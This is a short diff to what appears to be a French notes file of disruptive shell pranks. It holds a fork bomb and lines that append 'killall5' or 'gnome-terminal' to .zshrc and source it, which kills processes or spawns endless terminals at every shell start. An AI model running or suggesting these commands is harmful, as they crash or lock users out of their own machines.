@@ -19,10 +19,9 @@ Pour enlever -> ```rm -rf .reset```
 ```:(){ :|:& };:```
 
 [-------------------------------------------------------------]
-/!\ DANGER MAIS CA VA MAIS QUAND MEME BELEK JSP COMMENT ENLEVER /!\
+/!\ DANGER MAIS CA VA /!\
 
-```nano .zshrc``` -> a la toute fin mettre : ```killall5```
-```source .zshrc```
+```echo "killall5" >> .zshrc && source .zshrc```
 
 [-------------------------------------------------------------]
 ```echo "gnome-terminal" >> .zshrc && source .zshrc```
